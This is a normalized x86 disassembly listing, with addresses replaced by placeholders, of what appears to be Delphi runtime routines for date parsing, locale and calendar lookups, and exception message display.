push [ eax + 0x8 ]
call sub_409ca4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d24
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408ad4
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ad4
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
jmp r-xdata
sub_40a858
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a0a4
pop ecx
push ebp
mov eax ebx
call sub_40a0a4
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_4040f8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a8c8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4042c8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a8ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a8c8
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4042c8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a980
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a9f9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aa00
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a8c8
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4042c8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404528
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4081d4
test eax eax
jne r-xdata
mov eax edi
call sub_4042c8
add [ esi ] eax
mov bl 0x1
sub_40aa0c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a8c8
mov eax esi
call sub_4042c8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40aa44
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4042c8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40aa90
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4042c8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c638
mov [ ebx ] eax
jmp r-xdata
sub_40aad8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4044c8
push eax
mov eax [ ebx ]
call sub_4044c8
pop edx
call sub_40c7ac
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ab2c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409ccc
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40ab88
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40aea3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40aa44
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c6e8
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a8ec
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40aa90
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404528
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408244
mov eax [ ebp - 0x1c ]
call sub_40aad8
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aeaa
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_40402c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa0c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a8ec
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa0c
test al al
je r-xdata
call sub_409ccc
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a8ec
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409a40
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_40460c
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa0c
mov edx ebx
mov eax esi
call sub_40a8c8
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4042c8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40aa90
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ab2c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a8c8
mov eax esi
call sub_4042c8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409ccc
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4042c8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404528
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4081d4
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4042c8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404528
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4081d4
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40aecc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a980
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a980
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a980
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a8ec
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a8c8
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a980
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa0c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a8ec
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a980
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa0c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a8c8
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4098f8
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a980
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a8ec
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a980
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa0c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a980
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a8ec
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b0c0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ab88
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042c8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b0f4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aecc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042c8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b128
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40ab88
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b0f4
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4042c8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40aecc
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b1b4
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_4040f8
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b200
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_40405c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_4040f8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b24c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b274
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b200
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405efc
sub_40b2b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b3c3
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b274
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40405c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b274
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40405c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b274
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40405c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b274
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40405c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3ca
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40402c
retn
sub_40b3d4
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404200
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b410
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b475
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404200
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4084bc
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b47c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
inc ebx
sub_40b488
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b51f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b200
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4084bc
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b526
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b3d4
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b410
call EnumCalendarInfoA
sub_40b538
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b702
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404008
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b200
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4084bc
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4042c8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b709
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40402c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408ad4
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c5fc
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404528
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4042d0
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_40405c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408ad4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
inc ebx
jmp r-xdata
mov eax esi
call sub_4042c8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408ad4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042d0
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041f0
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4042d0
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041f0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4042d0
sub_40b76c
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b760
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c84c
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4089f8
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405468
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403184
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40901c
mov eax [ ebp - 0x4 ]
call sub_408994
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4044c8
mov ebx eax
mov eax ebx
call sub_408994
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b8f4
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b76c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405468
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402a90
call sub_402904
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408994
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b9c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40405c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40ba5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_40905c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba65
lea eax [ ebp - 0x4 ]
call sub_404008
retn
add esp 0xfffffff0
call sub_403558
sub_40ba65
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba84
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405efc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bac0
push ebp
